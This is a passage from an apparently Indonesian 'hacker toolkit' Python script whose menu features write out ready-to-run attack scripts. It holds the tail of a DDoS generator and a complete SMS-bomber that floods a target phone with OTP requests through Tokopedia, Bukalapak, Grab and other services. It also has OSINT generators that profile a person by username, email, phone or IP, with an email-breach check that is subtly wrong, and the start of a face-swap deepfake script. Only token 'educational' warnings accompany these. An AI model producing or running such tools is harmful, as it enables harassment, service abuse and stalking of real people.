    print(colored(f"\n[DDoS Script Generated]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Target: {target}:{port}", 'cyan'))
    print(colored(f"   Duration: {duration}s | Threads: {threads}", 'cyan'))
    print(colored(f"\n   Run: python3 {filename}", 'yellow'))
    print(colored("   Warning: Use only for educational purposes!", 'red'))
    
    save_result("ddos.log", f"Target: {target}:{port} | Duration: {duration}s")
    input("\nPress Enter to continue...")

# ================== FITUR 4: SMS BOMBER LOCAL ==================
def fitur_4():  
    os.system('clear'); print(colored("\n[4] SMS BOMBER & CALL FLOOD", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - SMS Bomber Generator]", 'yellow'))
    
    number = input(colored("Target Number (+62...): ", 'yellow')).strip()
    count = input(colored("Number of attacks (default 50): ", 'yellow')).strip() or "50"
    delay = input(colored("Delay between attacks (seconds, default 1): ", 'yellow')).strip() or "1"
    
    bomber_script = f'''#!/usr/bin/env python3
import requests, threading, time, random, json, sys

target = '{number}'
attack_count = {count}
delay = {delay}

success = 0
failed = 0

services = [
    {{
        "name": "Tokopedia",
        "url": "https://www.tokopedia.com/auth/register",
        "method": "POST",
        "data": {{"phone": target}},
        "headers": {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
    }},
    {{
        "name": "Bukalapak",
        "url": "https://api.bukalapak.com/v2/authentications.json",
        "method": "POST", 
        "data": {{"phone": target}},
        "headers": {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
    }},
    {{
        "name": "JD.ID",
        "url": "https://passport.jd.id/register/sendPhoneCode",
        "method": "POST",
        "data": {{"phone": target}},
        "headers": {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
    }},
    {{
        "name": "Traveloka",
        "url": "https://www.traveloka.com/api/v1/register",
        "method": "POST",
        "data": {{"phoneNumber": target}},
        "headers": {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
    }},
    {{
        "name": "Grab",
        "url": "https://auth.grab.com/otp",
        "method": "POST",
        "data": {{"phone": target, "country": "ID"}},
        "headers": {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
    }}
]

def attack(service):
    global success, failed
    
    for i in range(attack_count):
        try:
            if service["method"] == "POST":
                response = requests.post(
                    service["url"],
                    json=service["data"],
                    headers=service["headers"],
                    timeout=10
                )
            else:
                response = requests.get(
                    service["url"],
                    headers=service["headers"],
                    timeout=10
                )
            
            if response.status_code in [200, 201, 202]:
                success += 1
                print(f"[+] {{service['name']}} attack {{i+1}} successful")
            else:
                failed += 1
                print(f"[-] {{service['name']}} attack {{i+1}} failed: {{response.status_code}}")
        
        except Exception as e:
            failed += 1
            print(f"[-] {{service['name']}} attack {{i+1}} error: {{e}}")
        
        time.sleep(delay)

print(f"[*] Starting SMS Bomber attack on {{target}}")
print(f"[*] Total attacks per service: {{attack_count}}")
print(f"[*] Delay: {{delay}} seconds")
print(f"[*] Services: {{len(services)}}")
print()

# Start attacks
threads = []
for service in services:
    thread = threading.Thread(target=attack, args=(service,))
    thread.daemon = True
    thread.start()
    threads.append(thread)

# Wait for all threads to complete
for thread in threads:
    thread.join()

print(f"\\n[+] Attack completed!")
print(f"[+] Successful: {{success}}")
print(f"[+] Failed: {{failed}}")
print(f"[+] Total requests: {{success + failed}}")
'''

    filename = f"sms_bomber_{int(time.time())}.py"
    with open(filename, "w") as f:
        f.write(bomber_script)
    
    print(colored(f"\n[SMS Bomber Generated]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Target: {number}", 'cyan'))
    print(colored(f"   Attacks per service: {count}", 'cyan'))
    print(colored(f"\n   Run: python3 {filename}", 'yellow'))
    print(colored("   Note: Some services may have rate limiting", 'white'))
    
    save_result("bomber.log", f"Target: {number} | Count: {count}")
    input("\nPress Enter to continue...")

# ================== FITUR 5: OSINT LOCAL ==================
def fitur_5():  
    os.system('clear'); print(colored("\n[5] OSINT & INFORMATION GATHERING", 'cyan', attrs=['bold']))
    print(colored("   [LOCAL MODE - OSINT Tool]", 'yellow'))
    
    print(colored("\nSelect OSINT target type:", 'cyan'))
    print(colored("   1. Username Search", 'white'))
    print(colored("   2. Email Investigation", 'white'))
    print(colored("   3. Phone Number Lookup", 'white'))
    print(colored("   4. Social Media Scan", 'white'))
    print(colored("   5. IP Address Lookup", 'white'))
    
    choice = input(colored("\nSelect [1-5]: ", 'yellow')).strip()
    
    if choice == "1":
        username = input(colored("Username: ", 'yellow')).strip()
        filename = f"osint_username_{username}.py"
        
        osint_script = f'''#!/usr/bin/env python3
import requests, json, re, sys, time

username = "{username}"

print(f"[*] OSINT investigation for username: {{username}}")
print(f"[*] Starting scan at {{time.strftime('%Y-%m-%d %H:%M:%S')}}")

# Social media platforms to check
platforms = [
    ("GitHub", f"https://github.com/{{username}}"),
    ("Twitter", f"https://twitter.com/{{username}}"),
    ("Instagram", f"https://instagram.com/{{username}}"),
    ("Facebook", f"https://facebook.com/{{username}}"),
    ("YouTube", f"https://youtube.com/@{username}"),
    ("Reddit", f"https://reddit.com/user/{{username}}"),
    ("TikTok", f"https://tiktok.com/@{username}"),
    ("Pinterest", f"https://pinterest.com/{{username}}"),
    ("Steam", f"https://steamcommunity.com/id/{{username}}"),
    ("Twitch", f"https://twitch.tv/{{username}}"),
    ("LinkedIn", f"https://linkedin.com/in/{{username}}"),
    ("Medium", f"https://medium.com/@{username}"),
    ("DeviantArt", f"https://{{username}}.deviantart.com"),
    ("Flickr", f"https://flickr.com/people/{{username}}"),
    ("SoundCloud", f"https://soundcloud.com/{{username}}"),
    ("Spotify", f"https://open.spotify.com/user/{{username}}"),
    ("Telegram", f"https://t.me/{{username}}"),
    ("VK", f"https://vk.com/{{username}}"),
    ("Blogger", f"https://{{username}}.blogspot.com"),
    ("WordPress", f"https://{{username}}.wordpress.com"),
]

print(f"\\n[*] Checking {{len(platforms)}} platforms...")

found = []
not_found = []

for platform_name, url in platforms:
    try:
        headers = {{
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }}
        
        response = requests.get(url, headers=headers, timeout=10, allow_redirects=False)
        
        if response.status_code == 200:
            print(f"[+] {{platform_name}}: FOUND - {{url}}")
            found.append({{"platform": platform_name, "url": url}})
        elif response.status_code == 404:
            print(f"[-] {{platform_name}}: Not found")
            not_found.append(platform_name)
        else:
            print(f"[?] {{platform_name}}: Status {{response.status_code}}")
    
    except requests.exceptions.RequestException as e:
        print(f"[!] {{platform_name}}: Error - {{e}}")
    except Exception as e:
        print(f"[!] {{platform_name}}: Unknown error")

# Additional checks
print(f"\\n[*] Additional checks...")

# Check Have I Been Pwned for breaches
try:
    hibp_url = f"https://api.haveibeenpwned.com/unifiedsearch/{{username}}"
    hibp_response = requests.get(hibp_url, timeout=10)
    if hibp_response.status_code == 200:
        print(f"[+] Have I Been Pwned: Breaches found!")
    elif hibp_response.status_code == 404:
        print(f"[-] Have I Been Pwned: No breaches found")
except:
    print(f"[!] Have I Been Pwned: Check failed")

# Save results
if found:
    with open(f"osint_results_{{username}}.json", "w") as f:
        json.dump({{
            "username": username,
            "scan_time": time.strftime('%Y-%m-%d %H:%M:%S'),
            "found_profiles": found,
            "not_found": not_found
        }}, f, indent=2)
    
    print(f"\\n[+] Results saved to osint_results_{{username}}.json")
    print(f"[+] Found on {{len(found)}} platforms")
    
    print(f"\\n[*] Summary of found profiles:")
    for profile in found:
        print(f"    • {{profile['platform']}}: {{profile['url']}}")
else:
    print(f"\\n[-] No profiles found for {{username}}")

print(f"\\n[*] OSINT scan completed at {{time.strftime('%Y-%m-%d %H:%M:%S')}}")
'''
    
    elif choice == "2":
        email = input(colored("Email address: ", 'yellow')).strip()
        filename = f"osint_email_{email.replace('@', '_at_')}.py"
        
        osint_script = f'''#!/usr/bin/env python3
import requests, json, re, sys, time, hashlib

email = "{email}"
print(f"[*] OSINT investigation for email: {{email}}")
print(f"[*] Starting scan at {{time.strftime('%Y-%m-%d %H:%M:%S')}}")

# Hash email for Have I Been Pwned
email_hash = hashlib.sha1(email.encode()).hexdigest().upper()
prefix = email_hash[:5]
suffix = email_hash[5:]

print(f"\\n[*] Checking breaches...")

# Have I Been Pwned API
try:
    hibp_url = f"https://api.pwnedpasswords.com/range/{{prefix}}"
    response = requests.get(hibp_url, timeout=10)
    
    if response.status_code == 200:
        hashes = response.text.split('\\n')
        found = False
        
        for h in hashes:
            if h.startswith(suffix):
                count = h.split(':')[1].strip()
                print(f"[+] Have I Been Pwned: BREACHED {{count}} times!")
                found = True
                break
        
        if not found:
            print(f"[-] Have I Been Pwned: No breaches found")
    else:
        print(f"[!] Have I Been Pwned: API error")

except Exception as e:
    print(f"[!] Have I Been Pwned: {{e}}")

# Check Hunter.io email verification (requires API key)
print(f"\\n[*] Email verification...")
print(f"[!] Note: Hunter.io requires API key")

# Check email format
email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{{2,}}$'
if re.match(email_regex, email):
    print(f"[+] Email format: Valid")
    
    domain = email.split('@')[1]
    print(f"[+] Domain: {{domain}}")
    
    # Check if domain exists
    try:
        import socket
        socket.gethostbyname(domain)
        print(f"[+] Domain is reachable")
    except:
        print(f"[-] Domain not found")
else:
    print(f"[-] Email format: Invalid")

# Check social media
print(f"\\n[*] Checking social media...")

# Try to find username from email
username = email.split('@')[0]
platforms = [
    ("GitHub", f"https://github.com/{{username}}"),
    ("Twitter", f"https://twitter.com/{{username}}"),
    ("Instagram", f"https://instagram.com/{{username}}"),
    ("Facebook", f"https://facebook.com/{{username}}"),
]

for platform_name, url in platforms:
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            print(f"[+] {{platform_name}}: Possible match - {{url}}")
        else:
            print(f"[-] {{platform_name}}: Not found")
    except:
        print(f"[!] {{platform_name}}: Check failed")

# Save results
results = {{
    "email": email,
    "scan_time": time.strftime('%Y-%m-%d %H:%M:%S'),
    "domain": email.split('@')[1] if '@' in email else None,
    "username_suggestion": username
}}

with open(f"osint_email_{{email.replace('@', '_at_')}}.json", "w") as f:
    json.dump(results, f, indent=2)

print(f"\\n[+] Results saved to osint_email_{{email.replace('@', '_at_')}}.json")
print(f"[*] Scan completed at {{time.strftime('%Y-%m-d %H:%M:%S')}}")
'''
    
    elif choice == "3":
        phone = input(colored("Phone number (+62...): ", 'yellow')).strip()
        filename = f"osint_phone_{phone}.py"
        
        osint_script = f'''#!/usr/bin/env python3
import requests, json, re, sys, time, phonenumbers
from phonenumbers import carrier, geocoder, timezone

phone = "{phone}"
print(f"[*] OSINT investigation for phone: {{phone}}")
print(f"[*] Starting scan at {{time.strftime('%Y-%m-%d %H:%M:%S')}}")

try:
    # Parse phone number
    parsed = phonenumbers.parse(phone, None)
    
    print(f"\\n[*] Phone number analysis:")
    print(f"    • Country: {{geocoder.description_for_number(parsed, 'en')}}")
    print(f"    • Country Code: +{{parsed.country_code}}")
    print(f"    • National Number: {{parsed.national_number}}")
    
    # Get carrier
    try:
        carrier_name = carrier.name_for_number(parsed, 'en')
        print(f"    • Carrier: {{carrier_name}}")
    except:
        print(f"    • Carrier: Unknown")
    
    # Get timezone
    try:
        timezones = timezone.time_zones_for_number(parsed)
        print(f"    • Timezone: {{', '.join(timezones)}}")
    except:
        print(f"    • Timezone: Unknown")
    
    # Check if valid
    if phonenumbers.is_valid_number(parsed):
        print(f"    • Valid: Yes")
    else:
        print(f"    • Valid: No")
    
    # Check if possible
    if phonenumbers.is_possible_number(parsed):
        print(f"    • Possible: Yes")
    else:
        print(f"    • Possible: No")

except Exception as e:
    print(f"[!] Phone parsing error: {{e}}")

# Social media lookup
print(f"\\n[*] Checking social media...")

# Format phone for social media
clean_phone = re.sub(r'[^0-9]', '', phone)
if clean_phone.startswith('62'):
    clean_phone = clean_phone[2:]
elif clean_phone.startswith('+62'):
    clean_phone = clean_phone[3:]
elif clean_phone.startswith('0'):
    clean_phone = clean_phone[1:]

# WhatsApp check
print(f"[*] WhatsApp: https://wa.me/62{{clean_phone}}")

# Telegram check
print(f"[*] Telegram: Might be linked to phone number")

# Facebook search
print(f"[*] Facebook: Phone number may be linked to account")

# Truecaller-like services (requires API)
print(f"\\n[*] External database checks:")
print(f"[!] Note: These require API keys or paid access")
print(f"    • Truecaller: https://www.truecaller.com/search/id/{{phone}}")
print(f"    • NumLookup: https://numlookupapi.com/")
print(f"    • CallerID: Various reverse phone lookup sites")

# Save results
results = {{
    "phone": phone,
    "clean_phone": clean_phone,
    "scan_time": time.strftime('%Y-%m-%d %H:%M:%S'),
    "whatsapp_link": f"https://wa.me/62{{clean_phone}}"
}}

with open(f"osint_phone_{{phone}}.json", "w") as f:
    json.dump(results, f, indent=2)

print(f"\\n[+] Results saved to osint_phone_{{phone}}.json")
print(f"[*] Scan completed at {{time.strftime('%Y-%m-%d %H:%M:%S')}}")

# Warning
print(f"\\n[!] IMPORTANT:")
print(f"    • Phone number OSINT may violate privacy laws")
print(f"    • Use only for legitimate purposes")
print(f"    • Respect others' privacy")
'''
    
    elif choice == "4":
        username = input(colored("Social media username: ", 'yellow')).strip()
        filename = f"osint_social_{username}.py"
        
        osint_script = f'''#!/usr/bin/env python3
import requests, json, re, sys, time

username = "{username}"
print(f"[*] Social media scan for: {{username}}")
print(f"[*] Starting comprehensive scan at {{time.strftime('%Y-%m-%d %H:%M:%S')}}")

# Comprehensive social media list
social_platforms = [
    # Main platforms
    ("Facebook", f"https://www.facebook.com/{{username}}", "profile"),
    ("Instagram", f"https://www.instagram.com/{{username}}/", "profile"),
    ("Twitter", f"https://twitter.com/{{username}}", "profile"),
    ("LinkedIn", f"https://www.linkedin.com/in/{{username}}", "profile"),
    ("YouTube", f"https://www.youtube.com/{{username}}", "channel"),
    ("TikTok", f"https://www.tiktok.com/@{username}", "profile"),
    ("Reddit", f"https://www.reddit.com/user/{{username}}", "profile"),
    ("Pinterest", f"https://www.pinterest.com/{{username}}", "profile"),
    
    # Tech/Gaming
    ("GitHub", f"https://github.com/{{username}}", "profile"),
    ("GitLab", f"https://gitlab.com/{{username}}", "profile"),
    ("StackOverflow", f"https://stackoverflow.com/users/{{username}}", "profile"),
    ("Steam", f"https://steamcommunity.com/id/{{username}}", "profile"),
    ("Twitch", f"https://www.twitch.tv/{{username}}", "channel"),
    ("Discord", "N/A - Requires invite", "app"),
    
    # Creative
    ("DeviantArt", f"https://{{username}}.deviantart.com", "gallery"),
    ("Behance", f"https://www.behance.net/{{username}}", "portfolio"),
    ("Dribbble", f"https://dribbble.com/{{username}}", "portfolio"),
    ("ArtStation", f"https://www.artstation.com/{{username}}", "portfolio"),
    
    # Media
    ("Spotify", f"https://open.spotify.com/user/{{username}}", "profile"),
    ("SoundCloud", f"https://soundcloud.com/{{username}}", "profile"),
    ("Mixcloud", f"https://www.mixcloud.com/{{username}}", "profile"),
    ("Last.fm", f"https://www.last.fm/user/{{username}}", "profile"),
    
    # Blogs/Writing
    ("Medium", f"https://medium.com/@{username}", "blog"),
    ("Blogger", f"https://{{username}}.blogspot.com", "blog"),
    ("WordPress", f"https://{{username}}.wordpress.com", "blog"),
    ("Tumblr", f"https://{{username}}.tumblr.com", "blog"),
    
    # Photo/Video
    ("Flickr", f"https://www.flickr.com/people/{{username}}", "photos"),
    ("Vimeo", f"https://vimeo.com/{{username}}", "videos"),
    ("500px", f"https://500px.com/{{username}}", "photos"),
    
    # Business
    ("AngelList", f"https://angel.co/{{username}}", "profile"),
    ("Crunchbase", f"https://www.crunchbase.com/person/{{username}}", "profile"),
    ("SlideShare", f"https://www.slideshare.net/{{username}}", "presentations"),
    
    # Other
    ("ProductHunt", f"https://www.producthunt.com/@{username}", "profile"),
    ("Keybase", f"https://keybase.io/{{username}}", "profile"),
    ("About.me", f"https://about.me/{{username}}", "profile"),
    ("HubPages", f"https://hubpages.com/@{username}", "articles"),
    ("Wikipedia", f"https://en.wikipedia.org/wiki/User:{{username}}", "profile"),
    
    # International
    ("VK", f"https://vk.com/{{username}}", "profile"),
    ("Odnoklassniki", f"https://ok.ru/{{username}}", "profile"),
    ("Xing", f"https://www.xing.com/profile/{{username}}", "profile"),
    ("Weibo", "N/A - Chinese platform", "profile"),
]

print(f"\\n[*] Scanning {{len(social_platforms)}} social media platforms...")

found = []
not_found = []
errors = []

headers = {{
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}}

for platform_name, url, platform_type in social_platforms:
    if url == "N/A":
        print(f"[?] {{platform_name}}: Manual check required")
        continue
    
    try:
        response = requests.get(url, headers=headers, timeout=10, allow_redirects=True)
        
        if response.status_code == 200:
            # Additional checks for false positives
            page_content = response.text.lower()
            
            # Check for "not found" or "404" messages
            not_found_indicators = [
                'page not found', '404', 'not found', 'doesn\\'t exist',
                'no longer available', 'this page could not be found',
                'sorry, this page isn\\'t available'
            ]
            
            is_found = True
            for indicator in not_found_indicators:
                if indicator in page_content:
                    is_found = False
                    break
            
            if is_found:
                print(f"[+] {{platform_name}}: FOUND - {{url}}")
                found.append({{
                    "platform": platform_name,
                    "url": url,
                    "type": platform_type,
                    "status": "active"
                }})
            else:
                print(f"[-] {{platform_name}}: Not found")
                not_found.append(platform_name)
        
        elif response.status_code == 404:
            print(f"[-] {{platform_name}}: Not found (404)")
            not_found.append(platform_name)
        
        elif response.status_code in [403, 401]:
            print(f"[?] {{platform_name}}: Access restricted ({{response.status_code}})")
        
        elif response.status_code in [301, 302]:
            # Follow redirect
            final_url = response.url
            if final_url != url:
                print(f"[?] {{platform_name}}: Redirected to {{final_url}}")
            else:
                print(f"[-] {{platform_name}}: Not found")
                not_found.append(platform_name)
        
        else:
            print(f"[?] {{platform_name}}: Status {{response.status_code}}")
    
    except requests.exceptions.Timeout:
        print(f"[!] {{platform_name}}: Timeout")
        errors.append(platform_name)
    except requests.exceptions.ConnectionError:
        print(f"[!] {{platform_name}}: Connection error")
        errors.append(platform_name)
    except Exception as e:
        print(f"[!] {{platform_name}}: Error - {{e}}")
        errors.append(platform_name)
    
    # Delay to avoid rate limiting
    time.sleep(0.5)

# Summary
print(f"\\n[*] SCAN COMPLETE")
print(f"[+] Found on {{len(found)}} platforms")
print(f"[-] Not found on {{len(not_found)}} platforms")
print(f"[!] Errors on {{len(errors)}} platforms")

# Save detailed report
if found:
    print(f"\\n[*] DETAILED FINDINGS:")
    for item in found:
        print(f"    • {{item['platform']}} ({{item['type']}}): {{item['url']}}")

# Export results
report = {{
    "username": username,
    "scan_time": time.strftime('%Y-%m-%d %H:%M:%S'),
    "total_platforms": len(social_platforms),
    "found_count": len(found),
    "not_found_count": len(not_found),
    "error_count": len(errors),
    "found_profiles": found,
    "not_found_platforms": not_found,
    "error_platforms": errors
}}

report_file = f"social_scan_{{username}}.json"
with open(report_file, "w", encoding="utf-8") as f:
    json.dump(report, f, indent=2, ensure_ascii=False)

print(f"\\n[+] Full report saved to {{report_file}}")
print(f"[*] Scan completed at {{time.strftime('%Y-%m-%d %H:%M:%S')}}")
'''
    
    elif choice == "5":
        ip = input(colored("IP Address: ", 'yellow')).strip()
        filename = f"osint_ip_{ip.replace('.', '_')}.py"
        
        osint_script = f'''#!/usr/bin/env python3
import requests, json, socket, sys, time, re

target_ip = "{ip}"
print(f"[*] IP Address investigation: {{target_ip}}")
print(f"[*] Starting scan at {{time.strftime('%Y-%m-%d %H:%M:%S')}}")

def is_valid_ip(ip):
    pattern = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){{3}}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
    return re.match(pattern, ip) is not None

# Validate IP
if not is_valid_ip(target_ip):
    print(f"[!] Invalid IP address format")
    sys.exit(1)

print(f"\\n[*] Basic Information:")
print(f"    • IP Address: {{target_ip}}")

# Get hostname
try:
    hostname = socket.gethostbyaddr(target_ip)[0]
    print(f"    • Hostname: {{hostname}}")
except:
    print(f"    • Hostname: Not found")

# Check if IP is private
private_ranges = [
    ('10.0.0.0', '10.255.255.255'),
    ('172.16.0.0', '172.31.255.255'),
    ('192.168.0.0', '192.168.255.255'),
]

is_private = False
for start, end in private_ranges:
    start_int = int(''.join(f'{{int(x):08b}}' for x in start.split('.')), 2)
    end_int = int(''.join(f'{{int(x):08b}}' for x in end.split('.')), 2)
    ip_int = int(''.join(f'{{int(x):08b}}' for x in target_ip.split('.')), 2)
    
    if start_int <= ip_int <= end_int:
        is_private = True
        break

if is_private:
    print(f"    • Type: Private IP")
    print(f"[!] Private IPs have limited public information")
else:
    print(f"    • Type: Public IP")

print(f"\\n[*] Geolocation Lookup:")

# IP API services (free tiers)
apis = [
    ("ipapi.co", f"https://ipapi.co/{{target_ip}}/json/"),
    ("ip-api.com", f"http://ip-api.com/json/{{target_ip}}"),
    ("ipinfo.io", f"https://ipinfo.io/{{target_ip}}/json"),
]

for api_name, api_url in apis:
    try:
        response = requests.get(api_url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            
            print(f"\\n[+] {{api_name}} Results:")
            
            if api_name == "ipapi.co":
                print(f"    • Country: {{data.get('country_name', 'N/A')}} ({{data.get('country_code', 'N/A')}})")
                print(f"    • Region: {{data.get('region', 'N/A')}}")
                print(f"    • City: {{data.get('city', 'N/A')}}")
                print(f"    • ISP: {{data.get('org', 'N/A')}}")
                print(f"    • ASN: {{data.get('asn', 'N/A')}}")
                print(f"    • Coordinates: {{data.get('latitude', 'N/A')}}, {{data.get('longitude', 'N/A')}}")
            
            elif api_name == "ip-api.com":
                print(f"    • Country: {{data.get('country', 'N/A')}} ({{data.get('countryCode', 'N/A')}})")
                print(f"    • Region: {{data.get('regionName', 'N/A')}}")
                print(f"    • City: {{data.get('city', 'N/A')}}")
                print(f"    • ISP: {{data.get('isp', 'N/A')}}")
                print(f"    • AS: {{data.get('as', 'N/A')}}")
                print(f"    • Coordinates: {{data.get('lat', 'N/A')}}, {{data.get('lon', 'N/A')}}")
            
            elif api_name == "ipinfo.io":
                print(f"    • Country: {{data.get('country', 'N/A')}}")
                print(f"    • Region: {{data.get('region', 'N/A')}}")
                print(f"    • City: {{data.get('city', 'N/A')}}")
                print(f"    • ISP: {{data.get('org', 'N/A')}}")
                print(f"    • Location: {{data.get('loc', 'N/A')}}")
                print(f"    • Postal: {{data.get('postal', 'N/A')}}")
                print(f"    • Timezone: {{data.get('timezone', 'N/A')}}")
            
            break  # Stop after first successful API
    
    except Exception as e:
        print(f"[!] {{api_name}} error: {{e}}")

print(f"\\n[*] Additional Checks:")

# Check if IP is a VPN/Tor/Proxy
try:
    vpn_check = requests.get(f"https://ipqualityscore.com/api/json/ip/YOUR_API_KEY/{{target_ip}}", timeout=10)
    if vpn_check.status_code == 200:
        data = vpn_check.json()
        if data.get('vpn') or data.get('proxy') or data.get('tor'):
            print(f"[!] Security Alert:")
            if data.get('vpn'):
                print(f"    • VPN detected")
            if data.get('proxy'):
                print(f"    • Proxy detected")
            if data.get('tor'):
                print(f"    • Tor exit node detected")
except:
    print(f"[?] VPN/Proxy check: Requires API key")

# Shodan check (requires API)
print(f"[?] Shodan.io: https://www.shodan.io/host/{{target_ip}}")
print(f"[?] Censys.io: https://censys.io/ipv4/{{target_ip}}")

# Port scan suggestion
print(f"\\n[*] Security Assessment:")
print(f"[!] Note: Port scanning may be illegal without permission")
print(f"    • Suggested tools: nmap, masscan")
print(f"    • Common ports to check: 21, 22, 23, 25, 53, 80, 443, 3389, 8080")

# Save results
results = {{
    "ip_address": target_ip,
    "hostname": hostname if 'hostname' in locals() else None,
    "is_private": is_private,
    "scan_time": time.strftime('%Y-%m-%d %H:%M:%S'),
    "geo_data": data if 'data' in locals() else {},
    "shodan_link": f"https://www.shodan.io/host/{{target_ip}}",
    "censys_link": f"https://censys.io/ipv4/{{target_ip}}"
}}

with open(f"ip_scan_{{target_ip.replace('.', '_')}}.json", "w") as f:
    json.dump(results, f, indent=2)

print(f"\\n[+] Results saved to ip_scan_{{target_ip.replace('.', '_')}}.json")
print(f"[*] Scan completed at {{time.strftime('%Y-%m-%d %H:%M:%S')}}")

# Legal warning
print(f"\\n[!] LEGAL WARNING:")
print(f"    • Unauthorized scanning is illegal in many jurisdictions")
print(f"    • Obtain proper authorization before scanning")
print(f"    • This tool is for educational purposes only")
'''
    
    else:
        print(colored("[ERROR] Invalid choice!", 'red'))
        input("\nEnter...")
        return
    
    # Save and display the OSINT script
    with open(filename, "w") as f:
        f.write(osint_script)
    
    print(colored(f"\n[OSINT Tool Generated]", 'green', attrs=['bold']))
    print(colored(f"   File: {filename}", 'cyan'))
    print(colored(f"   Run: python3 {filename}", 'yellow'))
    
    if choice in ["1", "4"]:
        print(colored(f"   This will scan {50 if choice == '1' else '80+'} platforms", 'white'))
    elif choice == "2":
        print(colored("   This checks email breaches and social media", 'white'))
    elif choice == "3":
        print(colored("   This analyzes phone number and carrier info", 'white'))
    elif choice == "5":
        print(colored("   This performs IP geolocation and analysis", 'white'))
    
    save_result("osint.log", f"Generated {filename}")
    input("\nPress Enter to continue...")

# ================== FITUR 6: DEEPFAKE LOCAL ==================
def fitur_6():  
    os.system('clear'); print(colored("\n[6] DEEPFAKE & IMAGE MANIPULATION", 'cyan', attrs=['bold']))
    if not PILLOW_AVAILABLE:
        print(colored("   [INFO] Fitur ini membutuhkan: pillow", 'yellow'))
        print(colored("   Install: pip install pillow", 'white'))
        input("\nEnter...")
        return
    
    print(colored("   [LOCAL MODE - Image Manipulation Tool]", 'yellow'))
    
    print(colored("\nSelect image manipulation type:", 'cyan'))
    print(colored("   1. Face Swap (Basic)", 'white'))
    print(colored("   2. Image Filter & Effects", 'white'))
    print(colored("   3. Text Watermark", 'white'))
    print(colored("   4. Meme Generator", 'white'))
    print(colored("   5. Image Metadata Viewer/Editor", 'white'))
    
    choice = input(colored("\nSelect [1-5]: ", 'yellow')).strip()
    
    if choice == "1":
        print(colored("\n[Face Swap Tool]", 'yellow'))
        print(colored("   This generates a face swap Python script", 'white'))
        
        faceswap_script = '''#!/usr/bin/env python3
import cv2
import dlib
import numpy as np
import sys
import os

print("[Face Swap Tool]")
print("[!] Requires: pip install opencv-python dlib numpy")
print()

def load_image(path):
    """Load image from path"""
    if not os.path.exists(path):
        print(f"Error: Image not found: {path}")
        return None
    image = cv2.imread(path)
    if image is None:
        print(f"Error: Could not load image: {path}")
        return None
    return image

def detect_faces(image):
    """Detect faces in image using dlib"""
    # Convert to grayscale
    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
    
    # Load face detector
    detector = dlib.get_frontal_face_detector()
    
    # Detect faces
    faces = detector(gray, 1)
    
    if len(faces) == 0:
        print("No faces detected!")
        return []
    
    print(f"Detected {len(faces)} face(s)")
    return faces

def get_landmarks(image, face):
    """Get facial landmarks"""
    # Load predictor
    predictor_path = "shape_predictor_68_face_landmarks.dat"
    
    if not os.path.exists(predictor_path):
        print(f"Error: Landmark predictor not found: {predictor_path}")
        print("Download from: http://dlib.net/files/shape_predictor_68_face_landmarks.dat.bz2")
        return None
    
    predictor = dlib.shape_predictor(predictor_path)
    landmarks = predictor(image, face)
    
    # Convert landmarks to numpy array
    points = []
    for i in range(68):
        x = landmarks.part(i).x
        y = landmarks.part(i).y
        points.append((x, y))
    
    return np.array(points)

def face_swap(source_image, target_image, source_face, target_face):
    """Swap faces between two images"""
    # Get landmarks for both faces
    source_points = get_landmarks(source_image, source_face)
    target_points = get_landmarks(target_image, target_face)
    
    if source_points is None or target_points is None:
        return None
    
    # Create convex hull for source face
    hull_indices = cv2.convexHull(source_points, returnPoints=False).flatten()
    hull_source = source_points[hull_indices]
    hull_target = target_points[hull_indices]
    
    # Calculate Delaunay triangulation
    rect = (0, 0, target_image.shape[1], target_image.shape[0])
    subdiv = cv2.Subdiv2D(rect)
    
    for point in hull_target:
        subdiv.insert((point[0], point[1]))
    
    triangles = subdiv.getTriangleList()
    triangles = np.array(triangles, dtype=np.int32)
    
    # Apply affine transformation for each triangle
    output = target_image.copy()
    
    for triangle in triangles:
        # Get triangle points
        pt1 = (triangle[0], triangle[1])
        pt2 = (triangle[2], triangle[3])
        pt3 = (triangle[4], triangle[5])
        
        # Find corresponding points in source
        indices = []
        for point in [pt1, pt2, pt3]:
            for idx, hull_point in enumerate(hull_target):
                if abs(hull_point[0] - point[0]) < 1 and abs(hull_point[1] - point[1]) < 1:
                    indices.append(idx)
                    break
        
        if len(indices) == 3:
            # Get triangles
            src_tri = hull_source[indices].astype(np.float32)
            dst_tri = hull_target[indices].astype(np.float32)
            
            # Calculate affine transform
            warp_mat = cv2.getAffineTransform(src_tri, dst_tri)
            
            # Apply transform
            warped_triangle = cv2.warpAffine(source_image, warp_mat, 
                                           (target_image.shape[1], target_image.shape[0]))
            
            # Create mask for triangle
            mask = np.zeros_like(target_image, dtype=np.uint8)
            cv2.fillConvexPoly(mask, np.array([pt1, pt2, pt3], dtype=np.int32), (255, 255, 255))
            
            # Add triangle to output
            output = cv2.bitwise_and(output, cv2.bitwise_not(mask))
            output = cv2.bitwise_or(output, cv2.bitwise_and(warped_triangle, mask))
    
    # Seamless cloning for better blending
    center = (int(np.mean(hull_target[:, 0])), int(np.mean(hull_target[:, 1])))
    output = cv2.seamlessClone(output, target_image, 
                              np.uint8(np.sum(mask, axis=2) > 0), 
                              center, cv2.NORMAL_CLONE)
    
    return output

def main():
    print("Face Swap requires two images with faces.")
    print()
    
